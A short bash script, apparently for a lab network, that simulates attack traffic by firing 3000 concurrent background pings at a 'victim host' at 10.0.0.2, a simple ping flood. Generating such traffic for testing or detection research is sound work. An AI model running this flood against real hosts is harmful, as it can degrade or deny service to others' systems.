#!/bin/bash

echo "[!] Starting ATTACK traffic simulation..."

#Send 3000 ping requests all at once to the victim host (h2)
for i in {1..3000}
do
    ping -c 1 10.0.0.2 > /dev/null &
done

echo "[✓] Attack traffic finished."
